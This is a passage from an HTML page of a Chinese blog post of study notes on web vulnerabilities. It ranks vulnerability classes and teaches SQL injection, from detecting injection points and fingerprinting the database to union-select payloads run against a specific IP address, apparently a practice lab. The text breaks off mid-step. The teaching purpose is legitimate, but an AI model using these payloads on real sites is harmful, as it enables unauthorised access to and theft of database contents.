@@ -1,0 +1,259 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Rayucan"><meta name="copyright" content="Rayucan"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>web漏洞 | Rayの云端小屋</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"example.com","root":"/","title":"Rayの云端小屋","version":"1.6.1","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="在挖漏洞前，做好信息收集   在分析漏洞时，首先要考虑的是漏洞危害和等级，这点非常重要  分类  上图右侧是常见漏洞，在比赛、实战等各种场景均有出现  上图左侧相对出现较少，但不代表不重要   平时学习的重点内容：  CTF SQL 注入、文件上传、反序列化（重点的重点）、代码执行  SRC（Security Response Center，安全应急响应中心） 均会出现，其中以逻辑安全居多  红">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web漏洞">
+<meta property="og:url" content="http://example.com/2023/02/26/web%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Rayの云端小屋">
+<meta property="og:description" content="在挖漏洞前，做好信息收集   在分析漏洞时，首先要考虑的是漏洞危害和等级，这点非常重要  分类  上图右侧是常见漏洞，在比赛、实战等各种场景均有出现  上图左侧相对出现较少，但不代表不重要   平时学习的重点内容：  CTF SQL 注入、文件上传、反序列化（重点的重点）、代码执行  SRC（Security Response Center，安全应急响应中心） 均会出现，其中以逻辑安全居多  红">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302261645077.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302262325196.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302262328714.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202303021700007.png">
+<meta property="article:published_time" content="2023-02-26T08:34:51.000Z">
+<meta property="article:modified_time" content="2023-03-02T09:07:02.414Z">
+<meta property="article:author" content="Rayucan">
+<meta property="article:tag" content="Web Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302261645077.jpg"></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Rayucan"><img width="96" loading="lazy" src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/20210515231431.jpg" alt="Rayucan"></a><div class="site-author-name"><a href="/about/">Rayucan</a></div><a class="site-name" href="/about/site.html">Rayの云端小屋</a><sub class="site-subtitle"></sub><div class="site-desciption">Gaze into abyss.</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">54</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">3</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">17</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Rayucan" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=775972516&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:775972516@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">高危漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%8D%B1%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">中危漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E5%8D%B1%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">低危漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB-1"><span class="toc-number">2.1.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%EF%BC%9F"><span class="toc-number">2.2.</span> <span class="toc-text">如何判断数据库类型？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E5%89%8D%E5%90%8E%E7%AB%AF"><span class="toc-number">2.2.1.</span> <span class="toc-text">根据前后端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.2.</span> <span class="toc-text">根据端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E7%89%B9%E6%9C%89%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.3.</span> <span class="toc-text">根据特有函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#len-%E5%92%8C-length"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">len 和 length</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#version-%E5%92%8C-version"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">version 和 @@version</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substr-%E5%92%8C-substring"><span class="toc-number">2.2.3.3.</span> <span class="toc-text">substr 和 substring</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.4.</span> <span class="toc-text">根据字符串处理方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MySQL"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Oracle"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">Oracle</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Server"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">SQL Server</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="toc-number">2.2.5.</span> <span class="toc-text">根据数据库特有的表</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MySQL-1"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Oracle-1"><span class="toc-number">2.2.5.2.</span> <span class="toc-text">Oracle</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Server-1"><span class="toc-number">2.2.5.3.</span> <span class="toc-text">SQL Server</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%9F"><span class="toc-number">2.3.</span> <span class="toc-text">如何判断注入点？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%81%E5%8A%9E%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">老办法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E4%B8%80%E8%88%AC%E8%BF%87%E7%A8%8B"><span class="toc-number">2.3.2.</span> <span class="toc-text">判断注入点的一般过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#root-%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.3.3.</span> <span class="toc-text">root 型注入点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-SQL-%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-number">2.4.</span> <span class="toc-text">如何防御 SQL 注入？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%85%A5%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6"><span class="toc-number">2.4.1.</span> <span class="toc-text">加入转义字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91-SQL"><span class="toc-number">2.4.2.</span> <span class="toc-text">预编译 SQL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%EF%BC%88Cross-Site-Scripting%EF%BC%8C%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">XSS（Cross Site Scripting，跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="toc-number">3.1.</span> <span class="toc-text">存储型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="toc-number">3.2.</span> <span class="toc-text">反射型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-%E5%9E%8B-XSS"><span class="toc-number">3.3.</span> <span class="toc-text">DOM 型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-XSS%EF%BC%9F"><span class="toc-number">3.4.</span> <span class="toc-text">如何防御 XSS？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%AD%98%E5%82%A8%E5%9E%8B%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">3.4.1.</span> <span class="toc-text">防御存储型、反射型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-DOM-%E5%9E%8B"><span class="toc-number">3.4.2.</span> <span class="toc-text">防御 DOM 型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">文件类型绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">文件头绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.</span> <span class="toc-text">文件后缀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E6%89%BE%E5%92%8C%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">4.4.</span> <span class="toc-text">如何查找和判断文件上传漏洞？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">4.4.1.</span> <span class="toc-text">黑盒测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">4.4.2.</span> <span class="toc-text">白盒测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%EF%BC%88Cross-Site-Request-Forgery%EF%BC%8C%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">CSRF（Cross Site Request Forgery，跨站请求伪造）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-CSRF-%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">5.1.</span> <span class="toc-text">如何防御 CSRF 攻击？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E6%A0%A1%E9%AA%8C"><span class="toc-number">5.1.1.</span> <span class="toc-text">令牌校验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E6%A0%A1%E9%AA%8C"><span class="toc-number">5.1.2.</span> <span class="toc-text">验证码校验</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://example.com/2023/02/26/web%E6%BC%8F%E6%B4%9E/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Rayucan"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Rayの云端小屋"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">web漏洞</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2023-02-26 16:34:51" itemprop="dateCreated datePublished" datetime="2023-02-26T16:34:51+08:00">2023-02-26</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2023-03-02 17:07:02" itemprop="dateModified" datetime="2023-03-02T17:07:02+08:00">2023-03-02</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E7%AC%94%E8%AE%B0/" style="--text-color:dimgray" itemprop="url" rel="index"><span itemprop="text">笔记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web-Security/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web Security</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><blockquote>
+<p>在挖漏洞前，做好信息收集</p>
+</blockquote>
+<blockquote>
+<p>在分析漏洞时，首先要考虑的是漏洞危害和等级，这点非常重要</p>
+</blockquote>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302261645077.jpg" alt="Snipaste_2023-02-26_16-42-51" loading="lazy"></p>
+<ul>
+<li><p>上图右侧是常见漏洞，在比赛、实战等各种场景均有出现</p>
+</li>
+<li><p>上图左侧相对出现较少，但不代表不重要</p>
+</li>
+</ul>
+<p>平时学习的重点内容：</p>
+<ul>
+<li><p>CTF</p>
+<p>SQL 注入、文件上传、<strong>反序列化（重点的重点）</strong>、代码执行</p>
+</li>
+<li><p>SRC（<code>Security Response Center，安全应急响应中心</code>）</p>
+<p>均会出现，其中以逻辑安全居多</p>
+</li>
+<li><p>红蓝对抗</p>
+<p>高危漏洞较多，与实战接近，涉及权限安全</p>
+</li>
+</ul>
+<h3 id="高危漏洞"><a href="#高危漏洞" class="headerlink" title="高危漏洞"></a>高危漏洞</h3><p>SQL 注入、文件上传、文件包含、代码执行、未授权访问、命令执行</p>
+<p>此类漏洞涉及：权限获取、敏感数据获取（泄露）</p>
+<h3 id="中危漏洞"><a href="#中危漏洞" class="headerlink" title="中危漏洞"></a>中危漏洞</h3><p>反序列化、逻辑安全</p>
+<p>相对高危漏洞有一部分影响</p>
+<h3 id="低危漏洞"><a href="#低危漏洞" class="headerlink" title="低危漏洞"></a>低危漏洞</h3><p>XSS 跨站、目录遍历、文件读取</p>
+<p>小部分信息泄露（网站源码、部分用户信息泄露）</p>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>两个条件，缺一不可：</p>
+<ul>
+<li>可控变量，如 <code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code> 的变量 id</li>
+<li>代入数据库查询</li>
+</ul>
+<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 以下均可能存在注入点
+www.xxx.com&#x2F;index.php?id&#x3D;666
+www.xxx.com&#x2F;?id&#x3D;666
+www.xxx.com&#x2F;index.php?id&#x3D;666&amp;x&#x3D;777
+
+www.xxx.com&#x2F;index.php &#x2F;&#x2F; 可能存在 POST 注入，参数在请求体
+    
+&#x2F;&#x2F; 另外，第 1、2 两条是等效的，index.php 可以省略</code></pre>
+
+<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 假设仅参数 x 有注入点
+www.xxx.com&#x2F;news.php?y&#x3D;666 and 1&#x3D;1&amp;x&#x3D;777
+www.xxx.com&#x2F;news.php?y&#x3D;666&amp;x&#x3D;777 and 1&#x3D;1
+www.xxx.com&#x2F;news.php?y&#x3D;666 and 1&#x3D;1&amp;x&#x3D;777 and 1&#x3D;1
+www.xxx.com&#x2F;news.php?xxx&#x3D;666&amp;xx&#x3D;777 and 1&#x3D;1
+    
+&#x2F;&#x2F; 第 2、3 两条注入测试正确</code></pre>
+
+<h3 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h3><ul>
+<li>盲注<ul>
+<li>布尔注入：只能从应用返回数据中判断 SQL 语句执行后的布尔值</li>
+<li>时间注入：没有明确的回显，只能用特定的时间函数来判断</li>
+</ul>
+</li>
+<li>报错注入：应用会显示全部或部分报错信息</li>
+<li>堆叠注入：有的应用加入 <code>;</code> 后，可执行多条 SQL 语句</li>
+</ul>
+<h3 id="如何判断数据库类型？"><a href="#如何判断数据库类型？" class="headerlink" title="如何判断数据库类型？"></a>如何判断数据库类型？</h3><h4 id="根据前后端"><a href="#根据前后端" class="headerlink" title="根据前后端"></a>根据前后端</h4><ul>
+<li>asp：SQL Server，Access</li>
+<li>.net：SQL Server</li>
+<li>php：MySQL，PostgreSQL</li>
+<li>java：Oracle，MySQL</li>
+</ul>
+<h4 id="根据端口"><a href="#根据端口" class="headerlink" title="根据端口"></a>根据端口</h4><ul>
+<li>Oracle：默认端口1521</li>
+<li>SQL Server：默认端口1433</li>
+<li>MySQL：默认端口3306</li>
+</ul>
+<h4 id="根据特有函数"><a href="#根据特有函数" class="headerlink" title="根据特有函数"></a>根据特有函数</h4><h5 id="len-和-length"><a href="#len-和-length" class="headerlink" title="len 和 length"></a>len 和 length</h5><ul>
+<li>len()：SQL Server 、MySQL 以及 db2 返回长度的函数</li>
+<li>length()：Oracle 和 INFORMIX 返回长度的函数</li>
+</ul>
+<h5 id="version-和-version"><a href="#version-和-version" class="headerlink" title="version 和 @@version"></a>version 和 @@version</h5><ul>
+<li>version()：MySQL 查询版本信息的函数</li>
+<li>@@version：MySQL 和 SQL Serve r查询版本信息的函数</li>
+</ul>
+<h5 id="substr-和-substring"><a href="#substr-和-substring" class="headerlink" title="substr 和 substring"></a>substr 和 substring</h5><ul>
+<li>MySQL 两个函数都可以使用</li>
+<li>Oracle 只可调用substr</li>
+<li>SQL Server 只可调用substring</li>
+</ul>
+<h4 id="根据字符串处理方式"><a href="#根据字符串处理方式" class="headerlink" title="根据字符串处理方式"></a>根据字符串处理方式</h4><h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; 
+http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and CONCAT(&#39;a&#39;,&#39;b&#39;)&#x3D;&#39;ab&#39; </code></pre>
+
+<h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;a&#39;||&#39;b&#39;&#x3D;&#39;ab&#39; 
+http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and CONCAT(&#39;a&#39;,&#39;b&#39;)&#x3D;&#39;ab&#39; </code></pre>
+
+<h5 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; </code></pre>
+
+<h4 id="根据数据库特有的表"><a href="#根据数据库特有的表" class="headerlink" title="根据数据库特有的表"></a>根据数据库特有的表</h4><h5 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</code></pre>
+
+<h5 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</code></pre>
+
+<h5 id="SQL-Server-1"><a href="#SQL-Server-1" class="headerlink" title="SQL Server"></a>SQL Server</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</code></pre>
+
+<h3 id="如何判断注入点？"><a href="#如何判断注入点？" class="headerlink" title="如何判断注入点？"></a>如何判断注入点？</h3><blockquote>
+<p>方法一定要灵活，不要局限于老套路</p>
+</blockquote>
+<h4 id="老办法"><a href="#老办法" class="headerlink" title="老办法"></a>老办法</h4><pre class="language-none"><code class="language-none">and 1&#x3D;1 页面正常
+and 1&#x3D;2 页面错误
+可能存在注入点
+
+如
+SELECT * FROM users WHERE id&#x3D;1 and 1&#x3D;1 LIMIT 0,1 正常
+SELECT * FROM users WHERE id&#x3D;1 and 1&#x3D;2 LIMIT 0,1 错误
+由此可判断存在逻辑运算，即存在注入点
+注意此处是 and 不是 or</code></pre>
+
+<blockquote>
+<p>特殊情况：</p>
+<p>如果测试过程中出现 404 错误，并跳回主页，说明该网站对输入进行了安全检测，一般就没有注入点</p>
+</blockquote>
+<h4 id="判断注入点的一般过程"><a href="#判断注入点的一般过程" class="headerlink" title="判断注入点的一般过程"></a>判断注入点的一般过程</h4><ul>
+<li><p>猜列数（字段数），用 <code>order by</code> 测试，<code>order by 1</code>、<code>order by 2</code>、<code>order by 3</code> 直到报错，最后的数量即是列数</p>
+</li>
+<li><p>报错后，进行猜解准备：<code>http://1.1.1.1:8848/index.php?id=1 union select 1,2,3</code></p>
+<p>目的是看哪些列会进行显示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302262325196.png" alt="image-20230226232549004" loading="lazy"></p>
+<p>这里表示 2,3 是显示位，可以显示数据，由此<strong>可将 2,3 替换成某些函数</strong></p>
+</li>
+<li><p>下一步，信息收集</p>
+<p>数据库版本 <code>version()</code></p>
+<p>数据库名 <code>database()</code></p>
+<p>数据库用户 <code>user()</code></p>
+<p>操作系统  <code>@@version_compile_os</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302262328714.png" alt="image-20230226232841561" loading="lazy"></p>
+<blockquote>
+<p>在 MySQL 5.0 以上版本中，存在一个 <strong>information_schema 数据库</strong>，它存储着所有<strong>数据库名、表名、列名</strong></p>
+<ul>
+<li><p>高版本可以通过它来获取指定数据库下的表名或列名信息</p>
+</li>
+<li><p>低版本则只能暴力查询或结合读取查询</p>
+</li>
+</ul>
+</blockquote>
+</li>
+<li><p>查询数据库名称和数据库版本</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,database(),version(),4</code></pre></li>
+<li><p>查询数据库用户和操作系统</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,user(),@@version_compile_os,4</code></pre></li>
+<li><p>查询指定数据库名 <code>mozhe_Discuz_StormGroup</code> 下的表名信息</p>
